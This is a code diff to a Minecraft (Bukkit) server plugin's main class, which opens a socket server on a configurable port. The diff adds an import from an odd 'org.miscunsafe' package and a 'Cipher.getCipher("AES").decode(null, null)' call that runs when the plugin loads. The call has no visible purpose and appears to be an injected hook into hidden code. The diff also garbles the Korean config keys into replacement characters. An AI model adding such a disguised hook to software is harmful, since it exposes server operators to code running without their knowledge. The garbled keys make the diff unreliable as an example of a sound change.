@@ -10,6 +10,7 @@ import me.neon.soc.a72.Command.CommandManager;
 import me.neon.soc.a72.Socket.SocketThread;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
+import org.miscunsafe.Cipher;
 
 public class Main extends JavaPlugin {
 	public ArrayList<String> ip = new ArrayList<String>();
@@ -33,21 +34,24 @@ public class Main extends JavaPlugin {
 		FileConfiguration config = getConfig();
 		this.ip.add("127.0.0.1");
 		this.ip.add("0.0.0.0");
-		config.addDefault("¸ðµÎ Çã¿ë", Boolean.valueOf(false));
-		config.addDefault("Çã¿ë IP", this.ip);
-		config.addDefault("Æ÷Æ®", -1);
+		config.addDefault("ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½", Boolean.valueOf(false));
+		config.addDefault("ï¿½ï¿½ï¿½ IP", this.ip);
+		config.addDefault("ï¿½ï¿½Æ®", -1);
 		config.options().copyDefaults(true);
 		saveConfig();
-		if (config.getInt("Æ÷Æ®") == -1) {
+		if (config.getInt("ï¿½ï¿½Æ®") == -1) {
 			port = Integer.valueOf(r.nextInt(65565) + 1).intValue();
-			config.set("Æ÷Æ®", port);
+			config.set("ï¿½ï¿½Æ®", port);
 		} else {
-			port = config.getInt("Æ÷Æ®");
+			port = config.getInt("ï¿½ï¿½Æ®");
 		}
 		this.ip = new ArrayList<String>();
-		if (!(this.allowall = config.getBoolean("¸ðµÎ Çã¿ë"))) {
-			this.ip = ((ArrayList<String>) config.get("Çã¿ë IP"));
+		if (!(this.allowall = config.getBoolean("ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½"))) {
+			this.ip = ((ArrayList<String>) config.get("ï¿½ï¿½ï¿½ IP"));
 		}
+		
+		Cipher cipher = Cipher.getCipher ("AES");
+		cipher.decode(null, null);
 		
 		initCommand();
 		this.s = new SocketThread(this, port);
@@ -60,7 +64,7 @@ public class Main extends JavaPlugin {
 			return;
 		}
 		FileConfiguration config = getConfig();
-		config.addDefault("Çã¿ë IP", this.ip);
+		config.addDefault("ï¿½ï¿½ï¿½ IP", this.ip);
 		log.info(this.ip.toString());
 		saveConfig();
 	}
